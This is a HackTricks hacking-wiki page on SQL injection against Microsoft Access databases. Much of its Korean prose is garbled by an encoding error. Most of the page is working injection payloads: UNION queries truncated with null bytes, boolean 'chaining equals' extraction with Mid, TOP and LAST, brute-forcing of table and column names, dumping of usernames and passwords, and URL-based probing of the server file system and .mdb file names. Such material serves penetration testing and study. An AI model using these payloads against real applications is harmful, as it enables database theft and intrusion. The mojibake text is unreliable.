# MS Access SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ì˜¨ë¼ì¸ ë†€ì´í„°

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## DB ì œí•œ ì‚¬í•­

### ë¬¸ìì—´ ì—°ê²°

ë¬¸ìì—´ ì—°ê²°ì€ `& (%26)` ë° `+ (%2b)` ë¬¸ìë¥¼ ì‚¬ìš©í•˜ì—¬ ê°€ëŠ¥í•©ë‹ˆë‹¤.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Comments

MS Accessì—ëŠ” ì£¼ì„ì´ ì—†ì§€ë§Œ, NULL ë¬¸ìë¡œ ì¿¼ë¦¬ì˜ ë§ˆì§€ë§‰ì„ ì œê±°í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë‹¤ê³  í•©ë‹ˆë‹¤:
```sql
1' union select 1,2 from table%00
```
ì¿¼ë¦¬ì˜ êµ¬ë¬¸ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

ì§€ì›ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

### LIMIT

**`LIMIT`** ì—°ì‚°ìëŠ” **êµ¬í˜„ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ **`TOP` ì—°ì‚°ì**ë¥¼ ì‚¬ìš©í•˜ì—¬ SELECT ì¿¼ë¦¬ ê²°ê³¼ë¥¼ **ì²« N í…Œì´ë¸” í–‰ìœ¼ë¡œ ì œí•œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `TOP`ì€ ë°˜í™˜í•  í–‰ì˜ ìˆ˜ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ì •ìˆ˜ë¥¼ ì¸ìˆ˜ë¡œ ë°›ìŠµë‹ˆë‹¤.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Just like TOP you can use **`LAST`** which will get the **rows from the end**.

## UNION Queries/Sub queries

In a SQLi you usually will want to somehow execute a new query to extract information from other tables. MS Access always requires that in **subqueries or extra queries a `FROM` is indicated**.\
So, if you want to execute a `UNION SELECT` or `UNION ALL SELECT` or a `SELECT` between parenthesis in a condition, you always **need to indicate a `FROM` with a valid table name**.\
Therefore, you need to know a **valid table name**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

{% hint style="warning" %}
ì´ê²ƒì€ í…Œì´ë¸”ì˜ ì´ë¦„ì„ ì•Œ í•„ìš” ì—†ì´ í˜„ì¬ í…Œì´ë¸”ì˜ ê°’ì„ ì¶”ì¶œí•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.
{% endhint %}

**MS Access**ëŠ” **`'1'=2='3'='asd'=false`**ì™€ ê°™ì€ **ì´ìƒí•œ êµ¬ë¬¸**ì„ í—ˆìš©í•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ SQL ì¸ì ì…˜ì€ **`WHERE`** ì ˆ ì•ˆì— ìˆê¸° ë•Œë¬¸ì— ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

MS Access ë°ì´í„°ë² ì´ìŠ¤ì— SQLiê°€ ìˆê³ , í•˜ë‚˜ì˜ **ì—´ ì´ë¦„ì´ username**ì´ë¼ëŠ” ê²ƒì„ ì•Œê³  (ë˜ëŠ” ì¶”ì¸¡í•˜ê³ ) ìˆìœ¼ë©°, ê·¸ê²ƒì´ **ì¶”ì¶œ**í•˜ê³ ì í•˜ëŠ” í•„ë“œë¼ê³  ê°€ì •í•´ ë³´ì‹­ì‹œì˜¤. ì²´ì¸ ë“±í˜¸ ê¸°ë²•ì„ ì‚¬ìš©í•  ë•Œ ì›¹ ì•±ì˜ ë‹¤ì–‘í•œ ì‘ë‹µì„ í™•ì¸í•˜ê³ , **`Mid`** í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë¸ŒìŠ¤íŠ¸ë§ì„ ì–»ëŠ” **ë¶€ìš¸ ì¸ì ì…˜**ìœ¼ë¡œ ì½˜í…ì¸ ë¥¼ ì ì¬ì ìœ¼ë¡œ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
'=(Mid(username,1,3)='adm')='
```
í…Œì´ë¸”ì˜ **ì´ë¦„**ê³¼ **ì—´**ì„ ì•Œê³  ìˆë‹¤ë©´, `Mid`, `LAST` ë° `TOP`ì˜ ì¡°í•©ì„ ì‚¬ìš©í•˜ì—¬ ë¶€ìš¸ SQLië¥¼ í†µí•´ **ëª¨ë“  ì •ë³´ë¥¼ ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### í…Œì´ë¸” ì´ë¦„ ê°•ì œ ì¶”ì¸¡

chaining equals ê¸°ë²•ì„ ì‚¬ìš©í•˜ì—¬ **í…Œì´ë¸” ì´ë¦„ì„ ê°•ì œ ì¶”ì¸¡**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
ì „í†µì ì¸ ë°©ë²•ì„ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Sqlmap ì¼ë°˜ í…Œì´ë¸” ì´ë¦„: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html) ì— ë˜ ë‹¤ë¥¸ ëª©ë¡ì´ ìˆìŠµë‹ˆë‹¤.

### ì—´ ì´ë¦„ ë¬´ì°¨ë³„ ëŒ€ì…

í˜„ì¬ ì—´ ì´ë¦„ì„ **ë¬´ì°¨ë³„ ëŒ€ì…**í•˜ì—¬ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. chaining equals trickì„ ì‚¬ìš©í•˜ì—¬:
```sql
'=column_name='
```
ë˜ëŠ” **group by**ë¥¼ ì‚¬ìš©í•˜ì—¬:
```sql
-1' GROUP BY column_name%00
```
ë˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ **ë‹¤ë¥¸ í…Œì´ë¸”**ì˜ ì—´ ì´ë¦„ì„ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

ìš°ë¦¬ëŠ” ì´ë¯¸ [**chaining equals technique**](ms-access-sql-injection.md#chaining-equals-+-substring) **ì„ ì‚¬ìš©í•˜ì—¬ í˜„ì¬ ë° ë‹¤ë¥¸ í…Œì´ë¸”ì—ì„œ ë°ì´í„°ë¥¼ ë¤í”„í•˜ëŠ” ë°©ë²•**ì— ëŒ€í•´ ë…¼ì˜í–ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ë‹¤ë¥¸ ë°©ë²•ë„ ìˆìŠµë‹ˆë‹¤:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
In a nutshell, ì¿¼ë¦¬ëŠ” ì„±ê³µ ì‹œ "200 OK"ë¥¼ íŠ¸ë¦¬ê±°í•˜ê±°ë‚˜ ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ "500 Internal Error"ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ "if-then" ë¬¸ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. TOP 10 ì—°ì‚°ìë¥¼ ì´ìš©í•˜ì—¬ ì²˜ìŒ 10ê°œì˜ ê²°ê³¼ë¥¼ ì„ íƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´í›„ LASTë¥¼ ì‚¬ìš©í•˜ì—¬ 10ë²ˆì§¸ íŠœí”Œë§Œ ê³ ë ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê°’ì— ëŒ€í•´ MID ì—°ì‚°ìë¥¼ ì‚¬ìš©í•˜ë©´ ê°„ë‹¨í•œ ë¬¸ì ë¹„êµë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. MIDì™€ TOPì˜ ì¸ë±ìŠ¤ë¥¼ ì ì ˆíˆ ë³€ê²½í•˜ë©´ ëª¨ë“  í–‰ì˜ "username" í•„ë“œ ë‚´ìš©ì„ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Time Based

Check [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Other Interesting functions

* `Mid('admin',1,1)` ìœ„ì¹˜ 1ì—ì„œ ê¸¸ì´ 1ì˜ ë¶€ë¶„ ë¬¸ìì—´ì„ ê°€ì ¸ì˜µë‹ˆë‹¤ (ì´ˆê¸° ìœ„ì¹˜ëŠ” 1).
* `LEN('1234')` ë¬¸ìì—´ì˜ ê¸¸ì´ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.
* `ASC('A')` ë¬¸ìì˜ ASCII ê°’ì„ ê°€ì ¸ì˜µë‹ˆë‹¤.
* `CHR(65)` ASCII ê°’ì—ì„œ ë¬¸ìì—´ì„ ê°€ì ¸ì˜µë‹ˆë‹¤.
* `IIF(1=1,'a','b')` if then
* `COUNT(*)` í•­ëª© ìˆ˜ë¥¼ ê³„ì‚°í•©ë‹ˆë‹¤.

## Enumerating tables

From [**here**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) you can see a query to get tables names:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
ê·¸ëŸ¬ë‚˜ `MSysObjects` í…Œì´ë¸”ì„ ì½ì„ ìˆ˜ ìˆëŠ” ì ‘ê·¼ ê¶Œí•œì´ **ì—†ëŠ” ê²½ìš°** SQL ì¸ì ì…˜ì„ ì°¾ëŠ” ê²ƒì´ ë§¤ìš° ì¼ë°˜ì ì´ë¼ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤.

## íŒŒì¼ ì‹œìŠ¤í…œ ì ‘ê·¼

### ì›¹ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ ì „ì²´ ê²½ë¡œ

**ì›¹ ë£¨íŠ¸ ì ˆëŒ€ ê²½ë¡œì— ëŒ€í•œ ì§€ì‹ì€ ì¶”ê°€ ê³µê²©ì„ ìš©ì´í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì• í”Œë¦¬ì¼€ì´ì…˜ ì˜¤ë¥˜ê°€ ì™„ì „íˆ ìˆ¨ê²¨ì§€ì§€ ì•Šì€ ê²½ìš°, ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ë°ì´í„°ë¥¼ ì„ íƒí•˜ë ¤ê³  ì‹œë„í•¨ìœ¼ë¡œì¨ ë””ë ‰í† ë¦¬ ê²½ë¡œë¥¼ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS AccessëŠ” **ì›¹ ë””ë ‰í† ë¦¬ ì „ì²´ ê²½ë¡œë¥¼ í¬í•¨í•˜ëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€**ë¡œ ì‘ë‹µí•©ë‹ˆë‹¤.

### íŒŒì¼ ì—´ê±°

ë‹¤ìŒ ê³µê²© ë²¡í„°ëŠ” **ì›ê²© íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ íŒŒì¼ì˜ ì¡´ì¬ë¥¼ ì¶”ë¡ í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì§€ì •ëœ íŒŒì¼ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš°, MS AccessëŠ” ë°ì´í„°ë² ì´ìŠ¤ í˜•ì‹ì´ ìœ íš¨í•˜ì§€ ì•Šë‹¤ëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

íŒŒì¼ì„ ì—´ê±°í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ **ë°ì´í„°ë² ì´ìŠ¤.í…Œì´ë¸” í•­ëª©ì„ ì§€ì •í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. **ì§€ì •ëœ íŒŒì¼ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš°**, MS AccessëŠ” **ë°ì´í„°ë² ì´ìŠ¤ í˜•ì‹ ì˜¤ë¥˜ ë©”ì‹œì§€**ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb íŒŒì¼ ì´ë¦„ ì¶”ì¸¡

**ë°ì´í„°ë² ì´ìŠ¤ íŒŒì¼ ì´ë¦„(.mdb)**ì€ ë‹¤ìŒ ì¿¼ë¦¬ë¡œ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

ì—¬ê¸°ì„œ **name\[i]ëŠ” .mdb íŒŒì¼ ì´ë¦„**ì´ê³  **realTableì€ ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì˜ ì¡´ì¬í•˜ëŠ” í…Œì´ë¸”**ì…ë‹ˆë‹¤. MS AccessëŠ” í•­ìƒ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ íŠ¸ë¦¬ê±°í•˜ì§€ë§Œ, ìœ íš¨í•˜ì§€ ì•Šì€ íŒŒì¼ ì´ë¦„ê³¼ ìœ íš¨í•œ .mdb íŒŒì¼ ì´ë¦„ì„ êµ¬ë³„í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### .mdb ë¹„ë°€ë²ˆí˜¸ í¬ë˜ì»¤

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html)ëŠ” Microsoft Access 95/97/2000/XP ë˜ëŠ” Jet Database Engine 3.0/4.0ì˜ ì£¼ìš” ë°ì´í„°ë² ì´ìŠ¤ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³µêµ¬í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë¬´ë£Œ ìœ í‹¸ë¦¬í‹°ì…ë‹ˆë‹¤.

## ì°¸ê³  ë¬¸í—Œ

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
